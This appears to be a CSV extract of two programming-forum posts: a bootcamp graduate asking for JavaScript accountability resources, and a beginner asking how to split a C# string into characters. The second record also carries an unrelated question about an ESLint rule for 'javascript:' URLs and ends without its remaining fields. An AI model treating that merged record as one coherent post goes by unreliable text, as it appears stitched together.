5216,2022-01-22 00:09:03,0,1,"I have recently decided to get back into the coding game after trying and failing to do it myself. In 2020, I attended Flatiron School, which is a full stack bootcamp, and a week into the in-person class, we went remote because of the pandemic. I did fine while in-person, but as soon as we went remote I found it more difficult to continue with the rest of my class. I graduated and then had a difficulty finding a job. I didn't do anything for about 6 months then was able to get a Junior QA contract job at the beginning of 2021. I had the job for 6 months then they terminated the contract. Pretty soon after I was able to get another contract job but that one didn't last as long. Since then I haven't been able to stay motivated to try and gain back the skills I learned. I want to jump back into Javascript but if I attempt it myself, I won't stay accountable. If anyone knows if there is like a javascript discord/anything like that or any pointers on what to do I would be very appreciative.",[AskJS] I am in need of some guidance
5217,2022-01-22 06:01:58,0,1,"I started making my first project in c# today (i have some experience with javascript) and I was wondering how you would split each individual character of a string into an array. 

What I have so far splits it by each space so if I were to enter ""hello"" the array would just be `[""hello""]` but entering ""h e l l o"" would make the string `[""h"", ""e"", ""l"", ""l"", ""o""]`.

My goal is to split a string into an array so that entering ""hello"" would return `[""h"", ""e"", ""l"", ""l"", ""o""]`. How would I do this?

Is there a way to set up eslint to use all the results but ignore javascript: protocol? I don't want to remove that rule from ESLint unless this is the only option.

The default way to disable a single rule is to add a comment, but I can't add anything before javascript.
